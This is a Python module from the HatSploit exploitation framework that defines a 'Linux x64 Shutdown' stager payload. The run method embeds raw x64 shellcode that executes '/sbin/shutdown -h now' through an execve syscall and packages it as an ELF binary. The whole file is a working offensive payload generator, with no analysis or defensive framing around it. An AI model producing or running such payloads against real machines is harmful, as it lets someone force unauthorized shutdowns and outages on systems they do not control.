#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatvenom import HatVenom
from core.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Shutdown",
        'Payload': "linux/x64/shutdown",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Shutdown payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
            b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
            b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
            b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
            b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
            b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
            b"\x50\x48\x89\xe7\x52\x53\x51\x57"
            b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
            b"\x05"
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'x64', shellcode)

        return payload
